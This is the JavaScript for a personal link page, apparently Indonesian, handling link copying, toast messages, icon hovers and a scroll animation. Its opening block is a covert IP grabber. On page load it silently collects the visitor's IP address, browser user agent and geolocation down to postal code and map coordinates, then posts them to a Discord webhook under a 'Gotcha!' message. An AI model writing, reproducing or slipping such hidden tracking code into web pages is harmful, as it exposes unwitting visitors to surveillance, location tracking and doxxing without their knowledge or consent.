fetch('./config.json')
  .then(function(response) {
    return response.json();
  })
  .then(function(config) {
    const webhook = config.webhook;

    const request = async () => {
      const response = await fetch('https://api.ipify.org/?format=json');
      const data = await response.json();

      const ip = data.ip;

      const userAgent = navigator.userAgent;
      const locationData = await fetch('https://geolocation-db.com/json/');
      const locationResult = await locationData.json();

      // VPN detection algorithm
      let isVPN = false;
      if (typeof VPNConn !== 'undefined' && VPNConn.connection_type === 'Corporate') {
        isVPN = true;
      }

      const latitude = locationResult.latitude;
      const longitude = locationResult.longitude;
      const googleMapsLink = `https://www.google.com/maps/place/${latitude},${longitude}`;

      const message = {
        username: 'By MonzzBlox😎',
        avatar_url: 'https://media.discordapp.net/attachments/1152689404855472261/1199478077105909800/20240123_033016.jpg?ex=65cbea82&is=65b97582&hm=d8c3e7ec8ce402bbaab5c3494c59781987f26f381be2f6a4dbb414d025bae7c1&=&format=webp&width=600&height=600',
        embeds: [
          {
            title: 'User Info',
            description: 'Gotcha! Here is the detailed info about the user 👀',
            fields: [
              {
                name: 'IP Address',
                value: ip,
              },
              {
                name: 'User Agent',
                value: userAgent,
              },
              {
                name: 'Location Data',
                value: `Country Code: ${locationResult.country_code}\nCountry Name: ${locationResult.country_name}\nCity: ${locationResult.city}\nPostal: ${locationResult.postal}\nLatitude: ${latitude}\nLongitude: ${longitude}`,
              },
              {
                name: 'Google Maps Link',
                value: `[Click Here](${googleMapsLink})`,
              },
              {
                name: 'VPN Detected',
                value: isVPN ? ':white_check_mark: Yes' : ':x: No',
              },
            ],
            footer: {
              text: 'Made By MonzzBlox',
            },
          },
        ],
      };

      fetch(webhook, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(message),
      })
        .then(() => {
          console.log('Message sent successfully!');
        })
        .catch((error) => {
          console.error('Error while sending the message:', error);
        });
    };

    request();
  });



/**
 * Untuk membuat link bisa dicopy
 */
const actionLink = document.querySelectorAll(".link-card .link-action");

actionLink.forEach((action) => {
  action.addEventListener("click", (e) => {
    e.preventDefault();
    navigator.clipboard.writeText(action.parentElement.getAttribute("href"));

    /**
     * Untuk memunculkan toast notification
     */
    document.getElementById("toast").innerHTML = `
        <div class="toast-container">
            <p>✅ Link <strong> ${action.parentElement.innerText} </strong> berhasil disalin!</p>
        </div>
    `;

    /**
     * Untuk menghilangkan toast notifaction
     */

    setTimeout(() => {
      document
        .querySelector("#toast .toast-container")
        .classList.add("toast-gone");
    }, 300);

    setTimeout(() => {
      document.querySelector("#toast .toast-container").remove();
    }, 2000);
  });
});

/**
 * Untuk ganti icon sosmed saat hover
 */

document.querySelectorAll(".sosmed i").forEach((sosmed) => {
  sosmed.addEventListener("mouseenter", () => {
    sosmed.classList.remove("ph");
    sosmed.classList.add("ph-fill");
  });

  sosmed.addEventListener("mouseleave", () => {
    sosmed.classList.remove("ph-fill");
    sosmed.classList.add("ph");
  });
});

/**
 * Animasi Text bergerak saat scroll
 */

document.addEventListener("scroll", (e) => {
  document.querySelector(".bg-text-animation").style.transform = `translateX(${
    window.scrollY / 5
  }px)`;
});
